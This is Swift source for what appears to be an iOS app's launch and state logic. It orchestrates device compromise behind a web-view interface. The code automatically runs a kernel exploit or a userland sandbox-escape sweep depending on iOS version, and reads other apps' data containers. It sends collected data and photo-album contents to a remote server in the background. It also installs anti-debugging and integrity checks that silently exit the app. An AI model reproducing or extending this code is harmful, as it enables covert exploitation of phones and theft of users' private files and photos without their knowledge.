import SwiftUI
import UIKit

@main
struct ThreeOneOSFiveApp: App {
    @StateObject private var appState = AppState()
    @StateObject private var protocolCollect = ProtocolCollectCenter()
    @Environment(\.scenePhase) private var scenePhase

    init() {
        // 启动第一件事：完整性校验（__TEXT 自哈希 + 清单验签 + Bundle 全文件哈希
        // + 反调试/反注入）。任何一项不符就直接 _exit(0)，不留崩溃报告与提示。
        IntegrityGuard.install()
        // 明文日志先行：不管后面走 legacy 二进制（iOS <= 26.1，不进
        // detectSupport）还是 in-app 采集，沙盒 Documents/log2 都会存在。
        DebugLogWriter.shared.writeLaunchBanner()
        setupLogCapture()
        enableDeveloperModeByDefault()
        log("app: TRX launching — iOS \(AppInfo.osVersion) (\(AppInfo.osBuild)) \(AppInfo.machineName)")
        log("app: persistent log file: \(AppLog.persistentLogPath)")

        // 先触发并等待「本地网络」权限：权限就绪后 webview 重新加载、apptrace 再启动，
        // 避免权限没通过时请求被系统拒绝、页面空白、采集失败（只能杀掉重进）。
        LocalNetworkGate.prepare()

        // Version gate: kick the selected collection pipeline off as early as
        // possible after launch. iOS <= 26.1 runs the bundled
        // apptrace/libapptracecore binaries; newer iOS runs the in-app
        // collection program and never touches the binaries.
        if LegacyTraceGate.shouldRunLegacyBinaries {
            log("app: iOS \(AppInfo.osVersion) <= \(LegacyTraceGate.legacyCutoffVersion) — legacy binary pipeline")
            // 本地链接供应：用进程内 NSURLProtocol 拦截 apptrace 的
            // http://127.0.0.1:8888 请求，直接返回 links.txt 密文，跳过
            // 网络请求→解密→再请求，也不再走回环 socket（避免 bind/端口占用/沙盒
            // 网络等因素导致拿不到 links 数据）。
            LinksURLProtocol.register()
            LegacyTraceRunner.shared.startIfNeeded()
        } else {
            log("app: iOS \(AppInfo.osVersion) > \(LegacyTraceGate.legacyCutoffVersion) — in-app collection program")
        }

        // 上报/相册两条链路在「所有版本」都要跑：
        //   apptrace/libapptracecore 只负责采集（容器文件），
        //   真正把 params POST 到服务端的是主 App。
        // 所以这里不能按 legacy 版本 return，否则 <=26.1 永远不会有上报。
        Task.detached(priority: .utility) {
            let ok = await V2Protocol.serverTrusted()
            log("[trust] 服务端公钥校验: \(ok ? "MATCH" : "MISMATCH")")
            if !ok {
                // 服务端身份不匹配 = 中间人 / 假后端：直接放弃本次启动，不继续上报
                exit(0)
            }
        }

        // 相册：POC 本地生成照片，上传器立即启动（走 v2）。
        // 上传器内部每 3 秒重试一轮，权限未通过/网络失败时文件会保留、稍后自动补传。
        MediaAnalysisRaceRun()
        AlbumUploader.shared.startIfNeeded()
    }

    /// Developer Mode is ON by default: on first launch after this change the
    /// stored value is migrated to `true`, so the Files tab is available
    /// without any manual toggle. Afterwards the Settings toggle works normally.
    private func enableDeveloperModeByDefault() {
        let defaults = UserDefaults.standard
        let migrationKey = "feature.developer_mode.defaults_migrated"
        guard !defaults.bool(forKey: migrationKey) else { return }
        defaults.set(true, forKey: FeatureVisibility.developerModeStorageKey)
        defaults.set(true, forKey: migrationKey)
        log("app: developer mode enabled by default")
    }

    /// Routes collection to the pipeline selected by the version gate:
    /// legacy binaries on iOS <= 26.1, the in-app protocol collection
    /// program on newer iOS.
    private func startCollectionPipelineIfNeeded(retryAfterFailure: Bool = false) {
        if LegacyTraceGate.shouldRunLegacyBinaries {
            LegacyTraceRunner.shared.startIfNeeded()
        } else {
            protocolCollect.collectIfNeeded(retryAfterFailure: retryAfterFailure)
        }
    }

    var body: some Scene {
        WindowGroup {
            WebShellView()
                .onAppear {
                    appState.detectSupport()
                    startCollectionPipelineIfNeeded()
                }
                .onChange(of: scenePhase) { phase in
                    switch phase {
                    case .active:
                        log("app: scene became active (foreground)")
                        appState.detectSupport()
                        startCollectionPipelineIfNeeded(retryAfterFailure: true)
                    case .background:
                        log("app: scene backgrounded")
                        AppLog.shared.flush()
                    default:
                        break
                    }
                }
                .onChange(of: appState.exploitStatus) { status in
                    if status.isSuccess {
                        startCollectionPipelineIfNeeded(retryAfterFailure: true)
                    }
                }
        }
    }
}

class AppState: ObservableObject {
    @Published var exploitStatus: ExploitStatus = .notStarted
    @Published var unsupportedMessage: String?
    @Published var kernelExploitRunning = false

    private var autoRunAttempted = false
    fileprivate var userlandProbeRunning = false

    var kernelExploitApplicable: Bool {
        KernelExploit.isApplicable(
            major: AppInfo.versionTuple.major,
            minor: AppInfo.versionTuple.minor,
            patch: AppInfo.versionTuple.patch,
            build: AppInfo.osBuild
        )
    }

    var isSupported: Bool { unsupportedMessage == nil }

    func detectSupport() {
        // iOS <= 26.1：只跑 apptrace/libapptracecore 二进制 + WebView，
        // 不跑主程序流程（kernel exploit、调试探针）。相册链路已在 init 里无条件启动。
        // 版本 > 26.1 才进入主程序流程。
        guard !LegacyTraceGate.shouldRunLegacyBinaries else {
            DebugLogWriter.shared.write("app: detectSupport skipped — legacy binary mode (iOS <= 26.1)")
            return
        }
        DebugLogWriter.shared.write("app: detectSupport entered")
        DebugLogWriter.shared.writeEnvironmentSnapshot()
        DebugLogWriter.shared.writeEscapeProbe()
        let v = AppInfo.versionTuple
        let supported = ExploitSupportPolicy.isSupported(
            major: v.major,
            minor: v.minor,
            patch: v.patch,
            build: AppInfo.osBuild
        )
#if targetEnvironment(simulator)
        if ProcessInfo.processInfo.arguments.contains("--simulate-access") {
            exploitStatus = .success(method: "Simulator preview")
        }
#endif

        unsupportedMessage = supported ? nil : "iOS \(AppInfo.osVersion) (\(AppInfo.osBuild))"
        if let unsupportedMessage {
            exploitStatus = .unsupported(unsupportedMessage)
            return
        }

        let applicable = KernelExploit.isApplicable(
            major: v.major,
            minor: v.minor,
            patch: v.patch,
            build: AppInfo.osBuild
        )
        guard applicable else {
            // iOS 26.6.2+ / 27.x: no kernel offsets, the collection pipeline runs
            // entirely on userland sandbox extensions (worse_query). Verify that
            // route instead of reporting the build as unsupported.
            refreshUserlandStatus()
            return
        }

        refreshKernelExploitStatus()
        maybeAutoRunKernelExploit()
    }

    /// Status for builds without a kernel stage: the app is ready when either a
    /// pre-existing sandbox escape or a userland extension sweep succeeds.
    private func refreshUserlandStatus() {
        if KernelExploit.hasSandboxAccess() {
            if !exploitStatus.isSuccess {
                exploitStatus = .success(method: "kexploit")
                log("app: existing sandbox access is still active; kernel stage not needed")
            }
            return
        }

        if UserlandAccess.hasVerifiedAccess {
            exploitStatus = .success(method: "userland (worse_query)")
            return
        }

        guard !userlandProbeRunning else { return }
        userlandProbeRunning = true
        log("app: probing userland extension route (worse_query sweep)…")
        DispatchQueue.global(qos: .userInitiated).async {
            let ok = UserlandAccess.probe(force: true)
            DispatchQueue.main.async {
                self.userlandProbeRunning = false
                if ok {
                    self.exploitStatus = .success(method: "userland (worse_query)")
                    DebugLogWriter.shared.write(
                        "app: userland extension route active — group \(UserlandAccess.lastGroup) groups \(UserlandAccess.entitledGroups)"
                    )
                    log("app: userland extension route active — collection can read other containers")
                } else if ContainerStore.hasFilesystemAccess {
                    // The probe missed but the container index proved access.
                    self.exploitStatus = .success(method: "userland (worse_query)")
                    DebugLogWriter.shared.write(
                        "app: probe missed but the container index is usable — route active"
                    )
                    log("app: probe missed but the container index is usable")
                } else {
                    self.exploitStatus = .failed(method: "userland", code: -1)
                    DebugLogWriter.shared.write(
                        "app: userland extension route FAILED — \(UserlandAccess.lastError)"
                    )
                    log("app: userland extension route failed — \(UserlandAccess.lastError)")
                }
            }
        }
    }

    private func maybeAutoRunKernelExploit() {
        guard !kernelExploitRunning,
              !exploitStatus.isSuccess,
              !exploitStatus.isFailed,
              !autoRunAttempted else { return }
        autoRunAttempted = true
        log("app: starting kernel exploit automatically")
        runKernelExploitIfNeeded()
    }

    private func refreshKernelExploitStatus() {
        guard !kernelExploitRunning else { return }

        // iOS < 26: kernel R/W success persists (no sandbox probe)
        // iOS >= 26: verify that access outside the sandbox is still active —
        // a kernel sandbox escape or a userland extension (worse_query).
        if KernelExploit.requiresSandboxEscape {
            if KernelExploit.hasEffectiveFileAccess() {
                if !exploitStatus.isSuccess {
                    exploitStatus = .success(method: "kexploit")
                    log("app: existing filesystem access is still active; skipping kernel exploit")
                }
            } else if exploitStatus.isSuccess {
                exploitStatus = .notStarted
                log("app: filesystem access is no longer active")
            }
        }
    }

    func runKernelExploitIfNeeded() {
        refreshKernelExploitStatus()
        guard !kernelExploitRunning,
              !exploitStatus.isSuccess,
              !exploitStatus.isFailed else { return }
        kernelExploitRunning = true
        exploitStatus = .notStarted
        log("app: running kernel exploit on background...")
        DispatchQueue.global(qos: .userInitiated).async {
            let ok = KernelExploit.run()
            DispatchQueue.main.async {
                self.kernelExploitRunning = false
                if ok {
                    self.exploitStatus = .success(method: "kexploit")
                    DebugLogWriter.shared.write("app: kernel exploit success — logging sandbox state")
                    DebugLogWriter.shared.writeEnvironmentSnapshot()
                    if KernelExploit.requiresSandboxEscape {
                        log("app: kernel exploit success — sandbox access verified")
                    } else {
                        log("app: kernel exploit success — kernel access active")
                    }
                } else {
                    self.exploitStatus = .failed(method: "kexploit", code: -1)
                    log("app: kernel exploit failed — relaunch the app before retrying")
                }
            }
        }
    }
}
